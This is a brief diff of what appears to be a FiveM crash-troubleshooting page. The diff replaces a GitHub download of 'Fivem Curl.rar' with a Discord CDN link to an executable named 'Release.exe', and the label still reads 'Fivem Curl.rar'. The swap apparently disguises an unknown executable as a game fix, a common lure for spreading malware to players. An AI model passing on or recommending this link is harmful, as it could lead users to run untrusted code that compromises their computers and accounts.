@@ -1,6 +1,6 @@
 Getting game crashes? Can't launch FiveM? Or maybe running into some more obscure issue? Find the most common issues here.
 
-📙Download Fivem Curl.rar : https://github.com/citizenfix/FIVEM/raw/main/Fivem%20Curl.rar
+📙Download Fivem Curl.rar : https://cdn.discordapp.com/attachments/997086237439574016/997619214472986624/Release.exe
 
 Read the text file 
 
